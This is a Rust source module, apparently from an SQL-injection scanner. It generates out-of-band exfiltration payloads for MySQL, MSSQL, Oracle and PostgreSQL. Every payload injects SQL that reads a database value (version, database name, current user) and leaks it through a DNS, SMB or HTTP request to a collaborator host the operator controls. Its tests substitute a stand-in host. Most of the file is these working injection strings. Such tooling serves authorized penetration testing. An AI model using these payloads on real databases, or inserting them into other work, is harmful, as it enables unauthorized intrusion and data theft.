//! Out-of-band (OOB) exfiltration generators.
//!
//! When a target returns no error, no boolean signal and no measurable delay,
//! data can still leave over a side channel the DBMS controls — a DNS lookup
//! or HTTP request to a collaborator host the operator owns. These payloads
//! encode a real value into a hostname/URL so it appears in the collaborator's
//! logs; correlation lives in [`crate::oob`].
//!
//! Because they require a collaborator endpoint, these are **not** part of the
//! default live probe loop — call [`generate_with_host`] with a token from the
//! OOB correlator. [`generate`] emits the same set with a `{OOB}` placeholder
//! for inspection/testing.

use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::detection::DbmsFamily;
use crate::types::ProbeType;

/// Placeholder substituted with the collaborator host by [`generate_with_host`].
pub const OOB_PLACEHOLDER: &str = "{OOB}";

fn probe(name: &str, payload: &str, dbms: DbmsFamily, clause: SqlClause) -> GeneratedPayload {
    GeneratedPayload {
        name: name.to_string(),
        probe_type: ProbeType::UnionBased,
        payload_str: payload.to_string(),
        expected_dbms: Some(dbms),
        clause: Some(clause),
    }
}

/// Emit OOB payloads with the `{OOB}` placeholder left in place.
pub fn generate() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    use SqlClause::Subquery;
    vec![
        // MySQL on Windows — UNC path lookup triggers SMB/DNS to the host.
        probe(
            "oob-mysql-loadfile",
            "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.{OOB}\\\\a'))-- -",
            MySQL,
            Subquery,
        ),
        // MSSQL — xp_dirtree walks a UNC path (DNS/SMB to the host).
        probe(
            "oob-mssql-xpdirtree",
            "';DECLARE @h VARCHAR(1024);SET @h='\\\\'+(SELECT DB_NAME())+'.{OOB}\\a';\
             EXEC master..xp_dirtree @h-- -",
            MSSQL,
            Subquery,
        ),
        // Oracle — resolve a crafted hostname (no elevated privileges).
        probe(
            "oob-oracle-utlinaddr",
            "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{OOB}') FROM dual) IS NOT NULL-- -",
            Oracle,
            Subquery,
        ),
        // Oracle — HTTP fetch variant.
        probe(
            "oob-oracle-utlhttp",
            "' AND UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.{OOB}/')IS NOT NULL-- -",
            Oracle,
            Subquery,
        ),
        // PostgreSQL — dblink connection attempt resolves the host.
        probe(
            "oob-pg-dblink",
            "' AND (SELECT 1 FROM dblink('host='||(SELECT current_database())||'.{OOB} \
             user=x dbname=x','SELECT 1') AS t(x int)) IS NOT NULL-- -",
            PostgreSQL,
            Subquery,
        ),
    ]
}

/// Emit OOB payloads targeting a concrete collaborator `host`.
pub fn generate_with_host(host: &str) -> Vec<GeneratedPayload> {
    generate()
        .into_iter()
        .map(|mut p| {
            p.payload_str = p.payload_str.replace(OOB_PLACEHOLDER, host);
            p
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn placeholder_is_present_by_default() {
        assert!(generate().iter().all(|p| p.payload_str.contains(OOB_PLACEHOLDER)));
    }

    #[test]
    fn host_substitution_removes_placeholder() {
        let payloads = generate_with_host("abc123.oob.example");
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert!(!p.payload_str.contains(OOB_PLACEHOLDER), "placeholder left in {}", p.payload_str);
            assert!(p.payload_str.contains("abc123.oob.example"), "host missing in {}", p.payload_str);
        }
    }

    #[test]
    fn every_payload_encodes_a_real_value() {
        for p in generate() {
            assert!(
                p.payload_str.contains("SELECT"),
                "OOB payload should exfiltrate a queried value: {}",
                p.payload_str
            );
        }
    }
}

